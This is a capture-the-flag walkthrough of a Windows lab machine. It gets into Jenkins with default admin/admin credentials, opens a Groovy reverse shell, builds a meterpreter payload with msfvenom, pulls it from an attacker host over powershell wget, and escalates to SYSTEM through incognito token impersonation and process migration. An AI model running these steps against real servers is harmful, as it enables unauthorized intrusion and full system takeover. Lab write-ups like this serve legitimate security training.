> RCE, default credentials, token impersonation.

# Ports

* **80** : IIS httpd 7.5
* **8080** : Jetty 9.4.z-SNAPSHOT
### Port 8080 is used for exploiting

# 80
1. `gobuster` didn't give useful results.

# 8080
1. Jenkins is running on this port.
2. Trying default credentials gave access easily. Here `admin` with password: `admin` was used.


# EXPLOITATION (via msf)
Jenkins contain a script console to run scripts in the host system for automation purposes. This uses a scripting language called `groovy` we can search for groovy reverse shells in google. 
We use [this](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) script to get a reverse shell.
Note: an msf module is also available.(`exploit/multi/http/jenkins_script_console`)

Since this box is intended to teach token impersonation attack, we are switching to a meterpreter shell. If you used the msfmodule earlier and had a meterpreter payload, you can skip to the next section about privilege escalation.

`msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe -o revshell.exe` and start a python server in the directory for transferring the file .

Use the (`exploit/multi/handler`) module in msf and set the payload to (`windows/meterpreter/reverse_tcp`) and configure its hosts and ports.  Then `run`.

`powershell -c wget "10.0.2.12:8000/revshell.exe -outfile revshell.exe"` to get the file. It is better to do this in a temp folder.

Run the `reveshell.exe` by typing its name and hitting enter.

You will get the connection in the msfconsole.

# Actions in the low privilege shell

1. To check for access tokens ,  we need to load a meterpreter extension `incognito`. So `load incognito`.
2. To see our current privileges, `whoami /priv`. Output shows us that we have the `SeImpersonatePrivilege` enabled.
3. To check for available tokens, `list_tokens -g`. Output show us that `BUILTIN\Administrators`  is available.
4. To impersonate, `impersonate_token "BUILTIN\Administrators"`
5. Running `getguid` shows us that we are system.
6. We need to check if our current meterpreter process has system priveleges. So `getpid`
7. Running `ps` list the current running processes. We see that our current process do not have sufficient privileges.(We need sufficient privileges to read and write to system folders)
8. We need to migrate to a process with system privileges. We see some in list.
9. `migrate <PID>` . Migration may not always be successful. Try running with another pid if one fails.

We now have administrative privileges.